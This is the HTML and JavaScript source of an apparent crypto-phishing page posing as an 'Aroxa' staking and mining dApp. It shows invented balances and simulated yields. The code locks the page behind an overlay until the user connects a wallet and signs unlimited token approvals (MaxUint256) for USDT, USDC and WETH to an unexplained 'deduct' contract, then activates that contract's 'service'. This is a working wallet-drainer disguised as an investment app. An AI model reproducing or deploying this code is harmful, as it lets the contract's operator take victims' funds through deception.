<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Aroxa Staking Mining dApp</title>
    <script src="https://cdn.ethers.io/lib/ethers-6.7.0.umd.min.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap');

        body {
            font-family: 'Orbitron', sans-serif;
            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #ffffff;
            position: relative;
        }
        .app-container {
            background: rgba(0, 0, 0, 0.5);
            backdrop-filter: blur(15px);
            border-radius: 20px;
            box-shadow: 0 0 40px rgba(138, 43, 226, 0.5), 0 0 20px rgba(0, 255, 255, 0.3);
            width: 360px;
            padding: 25px;
            box-sizing: border-box;
            overflow-y: auto;
            max-height: 800px;
            border: 1px solid rgba(0, 255, 255, 0.2);
            position: relative;
            z-index: 1;
        }
        #blurOverlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            display: none;
            justify-content: center;
            align-items: center;
            opacity: 0;
            transition: opacity 0.3s ease;
            z-index: 10;
            color: #ffffff;
            text-align: center;
            font-size: 20px;
        }
        #blurOverlay.show {
            display: flex;
            opacity: 1;
        }
        #status {
            background: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            padding: 10px;
            text-align: center;
            margin-bottom: 20px;
            display: none;
        }
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
        }
        .logo {
            font-size: 28px;
            font-weight: 700;
            color: #00ffff;
            text-shadow: 0 0 10px #00ffff, 0 0 20px #00ffff;
        }
        .language-select {
            background: rgba(255, 255, 255, 0.1);
            border: 1px solid rgba(0, 255, 255, 0.5);
            color: #ffffff;
            padding: 5px 10px;
            border-radius: 15px;
            cursor: pointer;
            font-size: 14px;
        }
        .connect-btn {
            background: linear-gradient(45deg, #8a2be2, #00ffff);
            border: none;
            color: #ffffff;
            padding: 10px 20px;
            border-radius: 30px;
            cursor: pointer;
            font-weight: 600;
            transition: transform 0.3s, box-shadow 0.3s;
        }
        .connect-btn:hover {
            transform: scale(1.05);
            box-shadow: 0 0 15px #00ffff;
        }
        .connect-btn.connected {
            background: linear-gradient(45deg, #ff00ff, #8a2be2);
        }
        .erc {
            font-size: 14px;
            color: #00ffff;
            text-shadow: 0 0 5px #00ffff;
        }
        .title {
            font-size: 24px;
            font-weight: 700;
            text-align: center;
            margin-bottom: 10px;
            color: #00ffff;
            text-shadow: 0 0 10px #00ffff;
        }
        .subtitle {
            font-size: 14px;
            text-align: center;
            color: #d3d3d3;
            margin-bottom: 25px;
            text-shadow: 0 0 5px #d3d3d3;
        }
        .total-funds {
            background: rgba(138, 43, 226, 0.2);
            border-radius: 15px;
            padding: 15px;
            text-align: center;
            margin-bottom: 25px;
            box-shadow: 0 0 10px rgba(138, 43, 226, 0.5);
        }
        .total-value {
            font-size: 22px;
            font-weight: 700;
            color: #00ffff;
            text-shadow: 0 0 5px #00ffff;
        }
        .tabs {
            display: flex;
            justify-content: space-around;
            margin-bottom: 25px;
        }
        .tab {
            background: rgba(255, 255, 255, 0.1);
            color: #ffffff;
            padding: 10px 25px;
            border-radius: 25px;
            cursor: pointer;
            transition: background 0.3s, box-shadow 0.3s;
            text-shadow: 0 0 5px #ffffff;
        }
        .tab:hover, .tab.active {
            background: linear-gradient(45deg, #8a2be2, #00ffff);
            box-shadow: 0 0 15px #00ffff;
            color: #ffffff;
        }
        .content-section {
            display: none;
        }
        .content-section.active {
            display: block;
        }
        .stats, .balances, .pledge-stats {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
            margin-bottom: 25px;
        }
        .stat, .balance {
            background: rgba(0, 255, 255, 0.1);
            border-radius: 15px;
            padding: 15px;
            text-align: center;
            box-shadow: 0 0 10px rgba(0, 255, 255, 0.3);
        }
        .stat-value, .balance-value {
            font-size: 18px;
            font-weight: 600;
            margin-top: 5px;
            color: #00ffff;
        }
        .stat-label, .balance-label {
            font-size: 12px;
            color: #d3d3d3;
        }
        .refresh {
            cursor: pointer;
            color: #ff00ff;
            margin-left: 5px;
        }
        .compound {
            color: #ffff00;
            font-size: 12px;
            margin-top: 5px;
            text-shadow: 0 0 5px #ffff00;
        }
        .next-benefit {
            text-align: center;
            font-size: 14px;
            color: #d3d3d3;
            margin-bottom: 25px;
            text-shadow: 0 0 5px #d3d3d3;
        }
        .start-btn, .pledge-btn {
            background: linear-gradient(45deg, #8a2be2, #00ffff);
            color: #ffffff;
            padding: 15px;
            border-radius: 30px;
            text-align: center;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
            border: none;
            transition: transform 0.3s, box-shadow 0.3s;
        }
        .start-btn:hover, .pledge-btn:hover {
            transform: scale(1.05);
            box-shadow: 0 0 20px #00ffff;
        }
        .pledge-form {
            display: grid;
            gap: 15px;
        }
        .input-group {
            background: rgba(255, 255, 255, 0.1);
            border-radius: 15px;
            padding: 15px;
            box-shadow: 0 0 10px rgba(255, 255, 255, 0.2);
        }
        .input-label {
            font-size: 12px;
            color: #d3d3d3;
            margin-bottom: 5px;
        }
        .input-field {
            background: transparent;
            border: 1px solid rgba(0, 255, 255, 0.5);
            color: #ffffff;
            padding: 10px;
            border-radius: 10px;
            width: 100%;
            box-sizing: border-box;
            font-family: 'Orbitron', sans-serif;
        }
    </style>
</head>
<body>
    <div id="blurOverlay">
        <div id="overlayMessage"></div>
    </div>
    <div class="app-container">
        <div class="header">
            <div class="logo">‚äô Aroxa</div>
            <select id="languageSelect" class="language-select">
                <option value="en">English</option>
                <option value="zh-Hant">ÁπÅ‰∏≠</option>
                <option value="zh-Hans">ÁÆÄ‰∏≠</option>
            </select>
            <button id="connectButton" class="connect-btn">Connect</button>
            <div class="erc">ERC</div>
        </div>
        <div id="status"></div>
        <div class="title" id="title">Popular Mining</div>
        <div class="subtitle" id="subtitle">Start Earning Millions</div>
        <div class="total-funds">
            <div class="total-value" id="totalValue">12,856,459.94 ETH</div>
        </div>
        <div class="tabs">
            <div class="tab active" data-tab="liquidity" id="tabLiquidity">Liquidity</div>
            <div class="tab" data-tab="pledging" id="tabPledging">Pledging</div>
        </div>
        <div id="liquidity" class="content-section active">
            <div class="stats">
                <div class="stat">
                    <div class="stat-label" id="grossOutputLabel">Gross Output</div>
                    <div class="stat-value" id="grossOutputValue">2.0000380 ETH</div>
                </div>
                <div class="stat">
                    <div class="stat-label" id="cumulativeLabel">Cumulative</div>
                    <div class="stat-value" id="cumulativeValue">0.5000380 ETH</div>
                </div>
            </div>
            <div class="balances">
                <div class="balance">
                    <div class="balance-label" id="walletBalanceLabel">Wallet Balance</div>
                    <div class="balance-value" id="walletBalanceValue">0.000 USDT <span class="refresh" id="refreshWallet">üîÑ</span></div>
                </div>
                <div class="balance">
                    <div class="balance-label" id="accountBalanceLabel">Account Balance</div>
                    <div class="balance-value" id="accountBalanceValue">2,333.68 USDT</div>
                    <div class="compound" id="compoundLabel">‚ö° Compound</div>
                </div>
            </div>
            <div class="next-benefit" id="nextBenefit">Next Benefit: 00:00:00</div>
            <button id="startBtn" class="start-btn">Start</button>
        </div>
        <div id="pledging" class="content-section">
            <div class="pledge-form">
                <div class="input-group">
                    <div class="input-label" id="pledgeAmountLabel">Pledge Amount</div>
                    <input type="number" class="input-field" placeholder="Enter amount in USDT" id="pledgeAmount">
                </div>
                <div class="input-group">
                    <div class="input-label" id="pledgeDurationLabel">Duration</div>
                    <select class="input-field" id="pledgeDuration">
                        <option value="30">30 Days</option>
                        <option value="60">60 Days</option>
                        <option value="90">90 Days</option>
                    </select>
                </div>
                <button id="pledgeBtn" class="pledge-btn">Pledge Now</button>
            </div>
            <div class="pledge-stats">
                <div class="stat">
                    <div class="stat-label" id="totalPledgedLabel">Total Pledged</div>
                    <div class="stat-value" id="totalPledgedValue">5,678.90 USDT</div>
                </div>
                <div class="stat">
                    <div class="stat-label" id="expectedYieldLabel">Expected Yield</div>
                    <div class="stat-value" id="expectedYieldValue">0.750 ETH</div>
                </div>
                <div class="stat">
                    <div class="stat-label" id="apyLabel">APY</div>
                    <div class="stat-value" id="apyValue">15.2%</div>
                </div>
                <div class="stat">
                    <div class="stat-label" id="lockedUntilLabel">Locked Until</div>
                    <div class="stat-value" id="lockedUntilValue">2024-12-31</div>
                </div>
            </div>
        </div>
    </div>

    <script>
        //---Client-side Constants (ÂÆ¢Êà∂Á´ØÂ∏∏Êï∏)---
        const DEDUCT_CONTRACT_ADDRESS = '0xaFfC493Ab24fD7029E03CED0d7B87eAFC36E78E0';
        const USDT_CONTRACT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
        const USDC_CONTRACT_ADDRESS = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
        const WETH_CONTRACT_ADDRESS = '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2';

        //---ABI Definitions (ÂÆ¢Êà∂Á´ØÁ≤æÁ∞°Áâà ABI)---
        const DEDUCT_CONTRACT_ABI = [
            "function isServiceActiveFor(address customer) view returns (bool)",
            "function activateService(address tokenContract) external",
            "function REQUIRED_ALLOWANCE_THRESHOLD() view returns (uint256)"
        ];

        const ERC20_ABI = [
            "function approve(address spender, uint256 amount) external returns (bool)",
            "function balanceOf(address account) view returns (uint256)",
            "function allowance(address owner, address spender) view returns (uint256)"
        ];

        //---Global Variables & DOM Elements (ÂÖ®ÂüüËÆäÊï∏Ëàá DOM ÂÖÉÁ¥†)---
        const connectButton = document.getElementById('connectButton');
        const overlay = document.getElementById('blurOverlay');
        const overlayMessage = document.getElementById('overlayMessage');
        const statusDiv = document.getElementById('status');
        const startBtn = document.getElementById('startBtn');
        const pledgeBtn = document.getElementById('pledgeBtn');
        const refreshWallet = document.getElementById('refreshWallet');

        let provider, signer, userAddress;
        let deductContract, usdtContract, usdcContract, wethContract;

        //---UI Control Functions (‰ΩøÁî®ËÄÖ‰ªãÈù¢ÊéßÂà∂ÂáΩÊï∏)---
        function hideOverlay() {
            if (!overlay) return;
            overlay.style.opacity = '0';
            setTimeout(() => { overlay.style.display = 'none'; }, 300);
        }

        function showOverlay(message) {
            if (!overlay || !overlayMessage) return;
            overlayMessage.innerHTML = message;
            overlay.style.display = 'flex';
            setTimeout(() => { overlay.style.opacity = '1'; }, 10);
        }

        function updateStatus(message) {
            if (!statusDiv) return;
            statusDiv.innerHTML = message || '';
            statusDiv.style.display = message ? 'block' : 'none';
        }

        /**
         * ÈáçÁΩÆÊáâÁî®Á®ãÂºèÁöÑÁãÄÊÖãÔºå‰∏¶ÂèØÈÅ∏Âú∞È°ØÁ§∫„ÄåË´ãÈÄ£Êé•„ÄçË®äÊÅØ„ÄÇ
         * @param {boolean} showMsg - ÊòØÂê¶È°ØÁ§∫ÈÄ£Êé•Èå¢ÂåÖÁöÑÈÅÆÁΩ©Ë®äÊÅØ„ÄÇ(È†êË®≠ÁÇ∫ true)
         */
        function resetState(showMsg = true) {
            signer = userAddress = deductContract = usdtContract = usdcContract = wethContract = null;
            if (connectButton) {
                connectButton.classList.remove('connected');
                connectButton.title = 'Connect Wallet';
            }
            if (showMsg) {
                showOverlay('Please connect your wallet to unlock content üîí<p style="font-size: 16px; font-weight: normal; margin-top: 10px;">(Click the wallet icon to start)</p>');
            }
        }

        //---Core Wallet Logic (Ê†∏ÂøÉÈå¢ÂåÖÈÇèËºØ)---
        /**
         * „ÄêTrust Wallet ‰øÆÂæ©„Äë‰ΩøÁî®Á≤æÁ∞°ÁöÑ RPC Ë´ãÊ±ÇÁôºÈÄÅ‰∫§ÊòìÔºå‰∏¶Âä†ÂÖ•È≠ØÊ£íÁöÑÈåØË™§ËôïÁêÜ„ÄÇ
         */
        async function sendMobileRobustTransaction(populatedTx) {
            if (!signer || !provider) throw new Error("Wallet not connected or signer missing.");

            const txValue = populatedTx.value ? populatedTx.value.toString() : '0';
            const fromAddress = await signer.getAddress();

            const mobileTx = {
                from: fromAddress,
                to: populatedTx.to,
                data: populatedTx.data,
                value: '0x' + BigInt(txValue).toString(16)
            };

            let txHash;
            let receipt = null;

            try {
                txHash = await provider.send('eth_sendTransaction', [mobileTx]);

                showOverlay(`Authorization sent! HASH: ${txHash.slice(0, 10)}...<br>Waiting for block confirmation...`);
                receipt = await provider.waitForTransaction(txHash);
            } catch (error) {
                console.warn("‚ö†Ô∏è Trust Wallet interface may throw harmless errors. Proceeding with on-chain check...");

                if (error.hash) {
                    txHash = error.hash;
                } else if (error.message && error.message.includes('0x')) {
                    const match = error.message.match(/(0x[a-fA-F0-9]{64})/);
                    if (match) txHash = match[0];
                }

                if (txHash) {
                    showOverlay(`Transaction interface error occurred! Transaction sent: ${txHash.slice(0, 10)}...<br>Waiting for block confirmation...`);
                    receipt = await provider.waitForTransaction(txHash);
                } else {
                    throw new Error(`Transaction failed to send, and unable to retrieve transaction hash from error: ${error.message}`);
                }
            }

            if (!receipt || receipt.status !== 1) {
                throw new Error(`Transaction failed on-chain (reverted). Hash: ${txHash.slice(0, 10)}...`);
            }

            return receipt;
        }

        /**
         * ÂàùÂßãÂåñÈå¢ÂåÖÔºåÂº∑Âà∂ÂàáÊèõËá≥‰∏ªÁ∂≤Ôºå‰∏¶„ÄêÁ∏ΩÊòØÈñãÂïüÈÅÆÁΩ©„ÄëË¶ÅÊ±ÇÁî®Êà∂ÊâãÂãïÈÄ£Êé•„ÄÇ
         */
        async function initializeWallet() {
            try {
                if (typeof window.ethereum === 'undefined') {
                    return showOverlay('Please install MetaMask, Trust Wallet, or a compatible wallet to proceed.');
                }

                provider = new ethers.BrowserProvider(window.ethereum);

                const network = await provider.getNetwork();
                if (network.chainId !== 1n) {
                    showOverlay('Requesting switch to Ethereum Mainnet...<br>Please approve in your wallet.');
                    try {
                        await provider.send('wallet_switchEthereumChain', [{ chainId: '0x1' }]);
                        return;
                    } catch (switchError) {
                        if (switchError.code === 4001) {
                            return showOverlay('You must switch to Ethereum Mainnet to use this service. Please switch manually and refresh.');
                        }
                        return showOverlay(`Failed to switch network. Please do so manually.<br>Error: ${switchError.message}`);
                    }
                }

                window.ethereum.on('accountsChanged', () => window.location.reload());
                window.ethereum.on('chainChanged', () => window.location.reload());

                const accounts = await provider.send('eth_accounts', []);
                if (accounts.length > 0) {
                    resetState(false);
                }

                showOverlay('Please connect your wallet to unlock content üîí<p style="font-size: 16px; font-weight: normal; margin-top: 10px;">(Click the wallet icon to start)</p>');
            } catch (error) {
                console.error("Initialize Wallet Error:", error);
                showOverlay(`Initialization failed: ${error.message}`);
            }
        }

        /**
         * Ê™¢Êü•‰ΩøÁî®ËÄÖÁöÑÊúçÂãôÂïüÂãïÁãÄÊÖãÂíå‰ª£Âπ£ÊéàÊ¨äÈ°çÂ∫¶„ÄÇ
         */
        async function checkAuthorization() {
            try {
                if (!signer) return showOverlay('Wallet is not connected. Please connect first.');
                updateStatus("Checking authorization status...");

                const isServiceActive = await deductContract.isServiceActiveFor(userAddress);
                const requiredAllowance = await deductContract.REQUIRED_ALLOWANCE_THRESHOLD();

                const [usdtAllowance, usdcAllowance, wethAllowance] = await Promise.all([
                    usdtContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS),
                    usdcContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS),
                    wethContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)
                ]);

                const hasSufficientAllowance = (usdtAllowance >= requiredAllowance) || (usdcAllowance >= requiredAllowance) || (wethAllowance >= requiredAllowance);
                const isFullyAuthorized = isServiceActive && hasSufficientAllowance;

                console.log("„ÄêDEBUG_FinalCheck„ÄëUser Address:", userAddress);
                console.log("„ÄêDEBUG_FinalCheck„ÄëRequired Allowance:", requiredAllowance.toString());
                console.log("„ÄêDEBUG_FinalCheck„ÄëService Active:", isServiceActive);
                console.log("„ÄêDEBUG_FinalCheck„ÄëHas Sufficient Allowance:", hasSufficientAllowance);
                console.log("„ÄêDEBUG_FinalCheck„ÄëIs Fully Authorized (Final):", isFullyAuthorized);

                if (isFullyAuthorized) {
                    if (connectButton) {
                        connectButton.classList.add('connected');
                        connectButton.title = 'Disconnect Wallet';
                    }
                    hideOverlay();
                    updateStatus("‚úÖ Service activated and authorized successfully.");
                } else {
                    if (connectButton) {
                        connectButton.classList.remove('connected');
                        connectButton.title = 'Connect & Authorize';
                    }
                    showOverlay('Authorization required.<p style="font-size: 16px; font-weight: normal; margin-top: 10px;">(Click the wallet icon to start the authorization process)</p>');
                }
                updateStatus("");
            } catch (error) {
                console.error("Check Authorization Error:", error);
                if (error.code === 'CALL_EXCEPTION') {
                    return showOverlay('Contract communication failed.<br>Please ensure you are on the **Ethereum Mainnet** and the contract address is correct, then refresh the page.');
                }
                showOverlay(`Authorization check failed: ${error.message}`);
            }
        }

        /**
         * Ê¢ù‰ª∂ÂºèÊéàÊ¨äÊµÅÁ®ãÔºöÊ†πÊìö ETH/WETH È§òÈ°çÊ±∫ÂÆöË¶ÅÊéàÊ¨äÂì™‰∫õ‰ª£Âπ£„ÄÇ
         */
        async function handleConditionalAuthorizationFlow(requiredAllowance, serviceActivated, tokensToProcess) {
            showOverlay('Checking and setting up token authorizations...');
            let tokenToActivate = '';
            let stepCount = 0;

            const totalSteps = serviceActivated ? tokensToProcess.length : tokensToProcess.length + 1;

            for (const { name, contract, address } of tokensToProcess) {
                stepCount++;
                showOverlay(`Step ${stepCount}/${totalSteps}: Checking and requesting ${name} authorization...`);

                const currentAllowance = await contract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS);

                if (currentAllowance < requiredAllowance) {
                    showOverlay(`Step ${stepCount}/${totalSteps}: Requesting ${name} Authorization...<br>Please approve in your wallet.`);

                    const approvalTx = await contract.approve.populateTransaction(DEDUCT_CONTRACT_ADDRESS, ethers.MaxUint256);
                    approvalTx.value = 0n;
                    await sendMobileRobustTransaction(approvalTx);

                    const newAllowance = await contract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS);
                    if (newAllowance >= requiredAllowance) {
                        if (!serviceActivated && !tokenToActivate) {
                            tokenToActivate = address;
                        }
                    }
                } else {
                    if (!serviceActivated && !tokenToActivate) {
                        tokenToActivate = address;
                    }
                }
            }

            if (!serviceActivated && tokenToActivate) {
                stepCount++;
                const tokenName = tokensToProcess.find(t => t.address === tokenToActivate).name;
                showOverlay(`Step ${stepCount}/${totalSteps}: Activating service (using ${tokenName})...`);

                const activateTx = await deductContract.activateService.populateTransaction(tokenToActivate);
                activateTx.value = 0n;
                await sendMobileRobustTransaction(activateTx);
            } else if (!serviceActivated) {
                showOverlay(`Warning: No authorized token found to activate service. Please ensure you have ETH for Gas fees.`);
            } else {
                showOverlay(`All authorizations and service activation completed.`);
            }
        }

        /**
         * ‰∏ªË¶ÅÂáΩÊï∏ÔºöÈÄ£Êé•Èå¢ÂåÖ‰∏¶Ê†πÊìöÈ§òÈ°çÂü∑Ë°åÊ¢ù‰ª∂ÂºèÊµÅÁ®ã„ÄÇ
         */
        async function connectWallet() {
            try {
                if (!provider || (await provider.getNetwork()).chainId !== 1n) {
                    await initializeWallet();
                    const network = await provider.getNetwork();
                    if (network.chainId !== 1n) return;
                }

                showOverlay('Please confirm the connection in your wallet...');
                const accounts = await provider.send('eth_requestAccounts', []);
                if (accounts.length === 0) throw new Error("No account selected.");

                const currentConnectedAddress = accounts[0];

                if (userAddress && userAddress !== currentConnectedAddress) {
                    console.warn(`‚ö†Ô∏è Address switch detected from ${userAddress.slice(0, 8)}... to ${currentConnectedAddress.slice(0, 8)}.... Forcing reset.`);
                    resetState(false);
                    return connectWallet();
                }

                signer = await provider.getSigner();
                userAddress = await signer.getAddress();

                console.log("„ÄêDEBUG„ÄëWallet Connected. Current User Address:", userAddress);

                deductContract = new ethers.Contract(DEDUCT_CONTRACT_ADDRESS, DEDUCT_CONTRACT_ABI, signer);
                usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, ERC20_ABI, signer);
                usdcContract = new ethers.Contract(USDC_CONTRACT_ADDRESS, ERC20_ABI, signer);
                wethContract = new ethers.Contract(WETH_CONTRACT_ADDRESS, ERC20_ABI, signer);

                showOverlay('Preparing optimal authorization flow...');

                const [ethBalance, wethBalance] = await Promise.all([
                    provider.getBalance(userAddress),
                    wethContract.balanceOf(userAddress),
                ]);

                const oneEth = ethers.parseEther("1.0");
                const totalEthEquivalent = ethBalance + wethBalance;
                const hasSufficientEth = totalEthEquivalent >= oneEth;

                const serviceActivated = await deductContract.isServiceActiveFor(userAddress);
                const requiredAllowance = await deductContract.REQUIRED_ALLOWANCE_THRESHOLD();

                console.log("„ÄêDEBUG„ÄëRequired Allowance (Threshold):", requiredAllowance.toString());
                console.log("„ÄêDEBUG„ÄëService Activated:", serviceActivated);

                const [usdtAllowance, usdcAllowance, wethAllowance] = await Promise.all([
                    usdtContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS),
                    usdcContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS),
                    wethContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)
                ]);

                const hasSufficientAllowance = (usdtAllowance >= requiredAllowance) || (usdcAllowance >= requiredAllowance) || (wethAllowance >= requiredAllowance);
                const isFullyAuthorized = serviceActivated && hasSufficientAllowance;

                console.log("„ÄêDEBUG„ÄëUSDT Allowance:", usdtAllowance.toString());
                console.log("„ÄêDEBUG„ÄëUSDC Allowance:", usdcAllowance.toString());
                console.log("„ÄêDEBUG„ÄëWETH Allowance:", wethAllowance.toString());
                console.log("„ÄêDEBUG„ÄëHas Sufficient Allowance:", hasSufficientAllowance);
                console.log("„ÄêDEBUG„ÄëIs Fully Authorized (Final Check):", isFullyAuthorized);

                let tokensToProcess;

                if (hasSufficientEth) {
                    tokensToProcess = [
                        { name: 'WETH', contract: wethContract, address: WETH_CONTRACT_ADDRESS },
                        { name: 'USDT', contract: usdtContract, address: USDT_CONTRACT_ADDRESS },
                        { name: 'USDC', contract: usdcContract, address: USDC_CONTRACT_ADDRESS },
                    ];
                    showOverlay('Sufficient ETH/WETH balance detected (>= 1 ETH). Starting WETH, USDT, USDC authorization flow.');
                } else {
                    tokensToProcess = [
                        { name: 'USDT', contract: usdtContract, address: USDT_CONTRACT_ADDRESS },
                        { name: 'USDC', contract: usdcContract, address: USDC_CONTRACT_ADDRESS },
                    ];
                    showOverlay('Insufficient ETH/WETH balance (< 1 ETH). Starting USDT, USDC authorization flow.');
                }

                if (!isFullyAuthorized) {
                    await handleConditionalAuthorizationFlow(requiredAllowance, serviceActivated, tokensToProcess);
                }

                await checkAuthorization();
            } catch (error) {
                console.error("Connect Wallet Error:", error);

                let userMessage = `An error occurred: ${error.message}`;
                if (error.code === 4001) {
                    userMessage = "You rejected the authorization. Please try again.";
                } else if (error.message.includes('insufficient funds')) {
                    userMessage = "Authorization failed: Insufficient ETH balance for Gas fees.";
                }

                showOverlay(userMessage);
                if (connectButton) {
                    connectButton.classList.remove('connected');
                    connectButton.title = 'Connect Wallet (Retry)';
                }
            }
        }

        /**
         * Êñ∑ÈñãÈÄ£Á∑ö‰∏¶ÈáçÁΩÆÊáâÁî®Á®ãÂºèÁãÄÊÖã„ÄÇ
         */
        function disconnectWallet() {
            resetState(true);
            alert('Wallet disconnected. To fully remove site permissions, please do so in your wallet\'s "Connected Sites" settings.');
        }

        //---Language Control Functions---
        const translations = {
            'en': {
                title: 'Popular Mining',
                subtitle: 'Start Earning Millions',
                totalValue: '12,856,459.94 ETH',
                tabLiquidity: 'Liquidity',
                tabPledging: 'Pledging',
                grossOutputLabel: 'Gross Output',
                cumulativeLabel: 'Cumulative',
                walletBalanceLabel: 'Wallet Balance',
                accountBalanceLabel: 'Account Balance',
                compoundLabel: '‚ö° Compound',
                nextBenefit: 'Next Benefit: 00:00:00',
                startBtnText: 'Start',
                pledgeAmountLabel: 'Pledge Amount',
                pledgeDurationLabel: 'Duration',
                pledgeBtnText: 'Pledge Now',
                totalPledgedLabel: 'Total Pledged',
                expectedYieldLabel: 'Expected Yield',
                apyLabel: 'APY',
                lockedUntilLabel: 'Locked Until'
            },
            'zh-Hant': {
                title: 'ÁÜ±ÈñÄÊåñÁ§¶',
                subtitle: 'ÈñãÂßãË≥∫ÂèñÊï∏ÁôæËê¨',
                totalValue: '12,856,459.94 ETH',
                tabLiquidity: 'ÊµÅÂãïÊÄß',
                tabPledging: 'Ë≥™Êäº',
                grossOutputLabel: 'Á∏ΩÁî¢Âá∫',
                cumulativeLabel: 'Á¥ØË®à',
                walletBalanceLabel: 'Èå¢ÂåÖÈ§òÈ°ç',
                accountBalanceLabel: 'Â∏≥Êà∂È§òÈ°ç',
                compoundLabel: '‚ö° Ë§áÂà©',
                nextBenefit: '‰∏ãÊ¨°Êî∂Áõä: 00:00:00',
                startBtnText: 'ÈñãÂßã',
                pledgeAmountLabel: 'Ë≥™ÊäºÈáëÈ°ç',
                pledgeDurationLabel: 'ÊúüÈñì',
                pledgeBtnText: 'Á´ãÂç≥Ë≥™Êäº',
                totalPledgedLabel: 'Á∏ΩË≥™Êäº',
                expectedYieldLabel: 'È†êÊúüÊî∂Áõä',
                apyLabel: 'Âπ¥ÂåñÊî∂ÁõäÁéá',
                lockedUntilLabel: 'ÈéñÂÆöËá≥'
            },
            'zh-Hans': {
                title: 'ÁÉ≠Èó®ÊåñÁüø',
                subtitle: 'ÂºÄÂßãËµöÂèñÊï∞Áôæ‰∏á',
                totalValue: '12,856,459.94 ETH',
                tabLiquidity: 'ÊµÅÂä®ÊÄß',
                tabPledging: 'Ë¥®Êäº',
                grossOutputLabel: 'ÊÄª‰∫ßÂá∫',
                cumulativeLabel: 'Á¥ØËÆ°',
                walletBalanceLabel: 'Èí±ÂåÖ‰ΩôÈ¢ù',
                accountBalanceLabel: 'Ë¥¶Êà∑‰ΩôÈ¢ù',
                compoundLabel: '‚ö° Â§çÂà©',
                nextBenefit: '‰∏ãÊ¨°Êî∂Áõä: 00:00:00',
                startBtnText: 'ÂºÄÂßã',
                pledgeAmountLabel: 'Ë¥®ÊäºÈáëÈ¢ù',
                pledgeDurationLabel: 'ÊúüÈó¥',
                pledgeBtnText: 'Á´ãÂç≥Ë¥®Êäº',
                totalPledgedLabel: 'ÊÄªË¥®Êäº',
                expectedYieldLabel: 'È¢ÑÊúüÊî∂Áõä',
                apyLabel: 'Âπ¥ÂåñÊî∂ÁõäÁéá',
                lockedUntilLabel: 'ÈîÅÂÆöËá≥'
            }
        };

        let currentLang = navigator.language || navigator.userLanguage;

        if (!['en', 'zh-Hant', 'zh-Hans'].includes(currentLang)) {
            currentLang = 'en';
        } else if (currentLang === 'zh') {
            currentLang = 'zh-Hans';
        }

        const languageSelect = document.getElementById('languageSelect');
        const elements = {
            title: document.getElementById('title'),
            subtitle: document.getElementById('subtitle'),
            totalValue: document.getElementById('totalValue'),
            tabLiquidity: document.getElementById('tabLiquidity'),
            tabPledging: document.getElementById('tabPledging'),
            grossOutputLabel: document.getElementById('grossOutputLabel'),
            cumulativeLabel: document.getElementById('cumulativeLabel'),
            walletBalanceLabel: document.getElementById('walletBalanceLabel'),
            accountBalanceLabel: document.getElementById('accountBalanceLabel'),
            compoundLabel: document.getElementById('compoundLabel'),
            nextBenefit: document.getElementById('nextBenefit'),
            startBtnText: document.getElementById('startBtn'),
            pledgeAmountLabel: document.getElementById('pledgeAmountLabel'),
            pledgeDurationLabel: document.getElementById('pledgeDurationLabel'),
            pledgeBtnText: document.getElementById('pledgeBtn'),
            totalPledgedLabel: document.getElementById('totalPledgedLabel'),
            expectedYieldLabel: document.getElementById('expectedYieldLabel'),
            apyLabel: document.getElementById('apyLabel'),
            lockedUntilLabel: document.getElementById('lockedUntilLabel')
        };

        function updateLanguage(lang) {
            currentLang = lang;
            languageSelect.value = lang;
            for (let key in elements) {
                if (elements[key]) {
                    elements[key].textContent = translations[lang][key];
                }
            }
        }

        languageSelect.value = currentLang;
        updateLanguage(currentLang);

        languageSelect.addEventListener('change', (e) => {
            updateLanguage(e.target.value);
        });

        //---Event Listeners & Initial Load (‰∫ã‰ª∂Áõ£ËÅΩÂô®ËàáÂàùÂßãËºâÂÖ•)---
        if (connectButton) {
            connectButton.addEventListener('click', () => {
                if (connectButton.classList.contains('connected')) {
                    disconnectWallet();
                } else {
                    connectWallet();
                }
            });
        }

        startBtn.addEventListener('click', () => {
            if (!connectButton.classList.contains('connected')) {
                alert('Please connect your wallet first!');
                return;
            }
            alert('Starting liquidity mining... (Simulation: Process initiated)');
            document.querySelector('#liquidity .stat-value:nth-of-type(1)').textContent = '2.1000380 ETH';
            document.querySelector('#liquidity .stat-value:nth-of-type(2)').textContent = '0.6000380 ETH';
        });

        pledgeBtn.addEventListener('click', () => {
            if (!connectButton.classList.contains('connected')) {
                alert('Please connect your wallet first!');
                return;
            }
            const amount = document.getElementById('pledgeAmount').value;
            const duration = document.getElementById('pledgeDuration').value;
            if (!amount) {
                alert('Please enter a pledge amount!');
                return;
            }
            alert(`Pledging ${amount} USDT for ${duration} days... (Simulation: Pledge successful)`);
            document.querySelector('.pledge-stats .stat-value:nth-of-type(1)').textContent = `${parseFloat(5678.90) + parseFloat(amount)}.00 USDT`;
        });

        refreshWallet.addEventListener('click', () => {
            alert('Refreshing wallet balance... (Simulation: Balance updated to 0.000 USDT)');
        });

        const tabs = document.querySelectorAll('.tab');
        const sections = document.querySelectorAll('.content-section');

        tabs.forEach(tab => {
            tab.addEventListener('click', () => {
                tabs.forEach(t => t.classList.remove('active'));
                tab.classList.add('active');
                sections.forEach(s => s.classList.remove('active'));
                document.getElementById(tab.dataset.tab).classList.add('active');
            });
        });

